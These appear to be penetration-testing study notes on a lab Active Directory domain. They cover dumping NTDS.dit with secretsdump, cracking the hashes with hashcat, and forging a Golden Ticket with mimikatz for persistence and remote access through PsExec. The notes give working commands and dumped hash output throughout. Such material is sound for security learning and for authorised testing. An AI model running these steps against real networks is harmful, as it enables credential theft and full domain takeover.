## We own the domain now what?  
In the event we manage to compromise Domain and there is still time in the engagement, we will continue to provide as much value to the client as possible.  

1. Dump NTDS.dit and crack passwords.
2. Enumerate further shares for sensitive information such as PII data and other findings so that this can be reported.
3. Create persistence in the event our main access is lost and also remember to remove rouge Domain Admin accounts.
4. Test for detections espicially for DA account creations. A good environment should detect these account creations.
5. Creating a Golden Ticket.

---

## 🚩 Dumping the NTDS.dit

### What is NTDS.dit?  
An extremely critical and highly sensitive database used to store AD data within Active Directory / Domain Controllers:
* user information
* group information
* security descriptors
* password hashes

Using a **known domain admin account** we could use secretsdump and its switch of **-just-dc-ntlm** to dump out the DCs NTDS file. A successful Domain dump will contain a range of information from: SAM, credentials, domains, krbtgt, hashes, local account users, pc logins, and other accounts that may of been created from ipv6 / relayx + mitm6 relay attack.  

example:

    impacket-secretsdump / secretsdump - impacket-secretsdump MARVEL.local/pparker:'Password1'@192.168.64.139 -just-dc-ntlm

using our malicious domain admin account hawkeye against the DC, we succesfully dumped the local SAM and more importantly the NTDS.dit file. From the dump we also see 'kerberos keys' and also the krbtgt which could be later leveraged in a kerberos ticket attack.

    impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138

![image](https://github.com/user-attachments/assets/dfe18c4b-7172-4012-8155-1c74bbd42f97)

Using -just-dc-ntlm with secretsdump will only dump out the NTDS.dit, filtering out the other data as the name implies.  

    root@kali:/home/kali# impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138 -just-dc-ntlm
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2617733570dcba888a76e40359f8a359:::
    MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
    MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
    MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
    MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
    avrrDOsNBw:1109:aad3b435b51404eeaad3b435b51404ee:253a38577fe79301cf439d788dfa3850:::
    hawkeye:1110:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
    HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:86757f6579150e5ef1901687a33b627b:::
    THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:2338c61f1a4137c16acab764b8fe5022:::
    SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:1d86510b8589eccf45424b657db6ab52:::
    [*] Cleaning up... 
    root@kali:/home/kali# 

Now that we have the NTLM hashes dumped out from the NTDS.dit, we should filter out the NT portions of the hashes in excel, place it in a .txt file and have it cracked with -m of 1000 (given they are just ntlm) using hashcat. With all the cracked passwords, we can place them back into excel to see the passwords to accounts and also for final reporting.  

![image](https://github.com/user-attachments/assets/bd6014ac-0ea6-472c-b1fb-27290f32b313)

    hashcat -m 1000 ntds111.txt 
    once finished
    hashcat -m 1000 ntds111.txt --show

![image](https://github.com/user-attachments/assets/8b8b4bfb-821c-449f-9edc-f909ce359101)

We can now apply the cracked passwords back to the excel and match the cracked passwords with the hashes through using =vlookup magic or bash script.   

### Note:  
ignore PC passwords, they are typically not going to be cracked and have low value in this scenario.

---

## 🚩 Golden Ticket Attacks  

### What is Golden Ticket Attacks?  
* when we compromise the krbtgt (kerboros ticket granting ticket) we essentially own the domains.
* we can request access to any resource or system on the domain.
* golden tickets == complete access to every machine.

### Why exploit Golden Tickets even when we own the Domain?
* laterally move into accounts that we may not be able to access using forged tickets.
* authenticate into accoutns without needing a password.
* if our domain account is removed, we can still gain access with a Golden Ticket creation, maintaining persistance.

**Using mimikatz.exe to generate Golden Tickets.** 
1. priv debug
2. lsadump for krbtgt account: to obtain sid, krbtgt ntlm hash
3. with the krbtgt hash we can use it to generate a Golden Ticket
4. use Golden Ticket to 'Pass the Ticket' to now access any machine within the domain
5. Golden Ticket can launch tools at machines or users in the same network without username / passwords - Gticket bypasses this requirement
6. when in any account, we could enumerate files and even spawn new shells

---

### Performing a Golden Ticket Attack with a Pass the Ticket attack  

1. On the DC we have obtained mimikatz.exe by GentleKiwi
3. We now aim to obtain the krbtgt account, Kerboros - ticket granting ticket account
4. This allows us to generate tickets if we have the hash of the krbtgt account
5. With the hash of the krbtgt account we can use it to access service and resource or create a 'Golden Ticket' and use that for access.

**From the DC, run cmd.exe as admin and the following:**  
    mimikatz.exe  
    privilige::debug  
    lsadump::lsa /inject /name:krbtgt  

![image](https://github.com/user-attachments/assets/7baacf00-be56-46aa-ba61-88670fbc1574)

**Here we have obtained the krbtgt details, and use these to 'Pass the Hash' to create a 'Golden Ticket Session':**  
user: krbtgt  
SID of Domain: S-1-5-21-277273238-679169888-2290246510  
ntlm hash: 2617733570dcba888a76e40359f8a359  
/id: 500 (admin account)  
/ptt:  pass the ticket  

**Generate a Golden Ticket and session with these details:**  

    mimikatz # kerberos::golden /User:FakeUser123 /domain:marvel.local /sid:S-1-5-21-277273238-679169888-2290246510 /krbtgt:2617733570dcba888a76e40359f8a359 /id:500 /ptt

![image](https://github.com/user-attachments/assets/668c803d-d4dc-4e3d-985f-a97a78ac3667)

**From this we have now obtained a Golden Ticket for our 'fakeuser123' in current session**  
pull up cmd with the newly created Golden Ticket session.
    
    misc::cmd
    *in new window*
    dir \\THEPUNISHER\c$

![image](https://github.com/user-attachments/assets/76543f30-69a5-4391-8f87-4b2ea17357d1)

We have gained access into THEPUNISHER machine. For further compromise of this user, we could install psexec.exe orr other a sysinternals tool on our attacker machine for remote code execution. Once downloaded, from the Golden Ticket, misc::cmd terminal we can use 'psexec.exe \\THEPUNISHER cmd.exe' to gain a reverse shell and functional interaction.  

---

**Conclusion:**
* Compromise a Domain Controller (DC) account.
* Hijack the krbtgt Ticket Granting Ticket (TGT) using lsadump.
* Use the krbtgt details to conduct a Pass-the-Hash (PTH) attack.
* Grant a Golden Ticket session with a fake user.
* With the Golden Ticket, access any service or resource due to having Ticket Granting Authority.
* Use the Golden Ticket session to gain access to THEPUNISHER machine.
* Enumerate shares on THEPUNISHER machine.
* With access to the shares, use PsExec or other remote code execution tools from the attacking terminal against THEPUNISHER.
